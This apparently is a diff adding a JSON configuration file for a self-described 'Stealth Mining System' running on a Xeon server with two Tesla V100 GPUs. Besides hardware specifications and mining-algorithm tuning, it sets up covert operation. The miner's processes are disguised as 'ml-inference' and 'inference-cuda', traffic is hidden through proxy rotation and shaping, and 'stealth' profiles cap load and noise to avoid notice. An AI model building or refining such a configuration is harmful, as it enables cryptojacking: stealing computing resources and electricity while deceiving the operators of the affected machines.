@@ -1,0 +1,182 @@
+{
+    "_comment": "Hardware-Specific Optimization Configuration for Stealth Mining System",
+    "_description": "Optimized configuration for Intel Xeon E5-2690 v4 with dual Nvidia Tesla V100 accelerators",
+    
+    "system_profile": {
+        "hardware_id": "xeon_e5_2690_v4_dual_tesla_v100",
+        "optimization_level": "maximum_performance",
+        "stealth_priority": "high",
+        "last_updated": "2024-12-19"
+    },
+
+    "cpu_specifications": {
+        "model": "Intel Xeon E5-2690 v4",
+        "architecture": "Broadwell-EP",
+        "cores": 14,
+        "threads": 28,
+        "base_frequency_ghz": 2.6,
+        "turbo_frequency_ghz": 3.5,
+        "cache_l3_mb": 35,
+        "tdp_watts": 135,
+        "memory_channels": 4,
+        "memory_speed_mhz": 2400,
+        "pcie_lanes": 40
+    },
+
+    "accelerators": {
+        "count": 2,
+        "model": "Nvidia Tesla V100",
+        "memory_gb": 16,
+        "architecture": "Volta",
+        "manufacturing_process": "12nm",
+        "specifications": {
+            "cuda_cores": 5120,
+            "tensor_cores": 640,
+            "rt_cores": 0,
+            "base_clock_mhz": 1246,
+            "boost_clock_mhz": 1380,
+            "memory_type": "HBM2",
+            "memory_bus_width": 4096,
+            "memory_bandwidth_gbps": 900,
+            "l2_cache_mb": 6,
+            "power_consumption_watts": 250,
+            "thermal_design_power": 250
+        },
+        "performance_metrics": {
+            "fp32_performance_tflops": 15.7,
+            "fp16_performance_tflops": 31.4,
+            "tensor_performance_tflops": 125,
+            "int8_performance_tops": 250,
+            "nvlink_version": "2.0",
+            "nvlink_bandwidth_gbps": 300,
+            "pcie_version": "3.0",
+            "pcie_bandwidth_gbps": 32
+        }
+    },
+
+    "mining_optimization": {
+        "cpu_mining": {
+            "algorithm_preference": ["RandomX", "CryptoNight", "Argon2"],
+            "thread_allocation": 26,
+            "reserved_threads": 2,
+            "frequency_scaling": "conservative",
+            "cache_optimization": true,
+            "numa_awareness": true
+        },
+        "gpu_mining": {
+            "primary_algorithms": ["Ethash", "KawPow", "Octopus", "Autolykos2"],
+            "memory_intensive_algorithms": ["Ethash", "ProgPoW", "KAWPOW"],
+            "compute_intensive_algorithms": ["Octopus", "Autolykos2", "BeamHash"],
+            "dual_gpu_strategy": "parallel_independent",
+            "load_balancing": "round_robin",
+            "memory_allocation": {
+                "gpu_0": "14GB",
+                "gpu_1": "14GB",
+                "system_reserve": "4GB"
+            },
+            "power_management": {
+                "power_limit_watts": [225, 225],
+                "temperature_target_celsius": 80,
+                "fan_curve": "aggressive_cooling"
+            }
+        }
+    },
+
+    "stealth_configurations": {
+        "process_masking": {
+            "cpu_process_name": "ml-inference",
+            "gpu_process_name": "inference-cuda",
+            "process_priority": "below_normal"
+        },
+        "thermal_management": {
+            "cpu_temp_limit": 75,
+            "gpu_temp_limit": 80,
+            "throttle_threshold": 82,
+            "emergency_shutdown": 90
+        },
+        "power_capping": {
+            "total_system_watts": 600,
+            "cpu_watts": 120,
+            "gpu_total_watts": 450,
+            "efficiency_mode": true
+        },
+        "network_profile": {
+            "bandwidth_limit_mbps": 100,
+            "connection_throttling": true,
+            "proxy_rotation": true,
+            "traffic_shaping": true
+        }
+    },
+
+    "performance_profiles": {
+        "stealth_mode": {
+            "cpu_usage_limit": 70,
+            "gpu_usage_limit": 75,
+            "power_limit": 80,
+            "noise_level": "silent",
+            "description": "Maximum stealth with reduced performance"
+        },
+        "balanced_mode": {
+            "cpu_usage_limit": 85,
+            "gpu_usage_limit": 90,
+            "power_limit": 90,
+            "noise_level": "moderate",
+            "description": "Balance between performance and stealth"
+        },
+        "performance_mode": {
+            "cpu_usage_limit": 95,
+            "gpu_usage_limit": 95,
+            "power_limit": 100,
+            "noise_level": "aggressive",
+            "description": "Maximum performance with minimal stealth"
+        }
+    },
+
+    "monitoring_thresholds": {
+        "temperature_alerts": {
+            "cpu_warning": 70,
+            "cpu_critical": 80,
+            "gpu_warning": 75,
+            "gpu_critical": 85
+        },
+        "performance_metrics": {
+            "hashrate_deviation_threshold": 5,
+            "efficiency_threshold": 0.85,
+            "uptime_target": 99.5
+        },
+        "security_monitoring": {
+            "process_scan_interval": 300,
+            "network_anomaly_detection": true,
+            "resource_usage_profiling": true
+        }
+    },
+
+    "hardware_specific_optimizations": {
+        "cpu_optimizations": {
+            "enable_hyperthreading": true,
+            "turbo_boost": "selective",
+            "c_states": "disabled",
+            "p_states": "performance",
+            "numa_balancing": true,
+            "cache_prefetching": true
+        },
+        "gpu_optimizations": {
+            "memory_clock_offset": 500,
+            "core_clock_offset": 100,
+            "power_target": 90,
+            "temperature_target": 80,
+            "fan_speed": "auto",
+            "compute_mode": "exclusive_process",
+            "ecc_memory": true,
+            "nvlink_topology": "nvswitch"
+        },
+        "system_optimizations": {
+            "memory_frequency": 2400,
+            "memory_timings": "tight",
+            "pcie_speed": "gen3",
+            "cpu_governor": "performance",
+            "io_scheduler": "deadline",
+            "transparent_hugepages": "always"
+        }
+    }
+} 
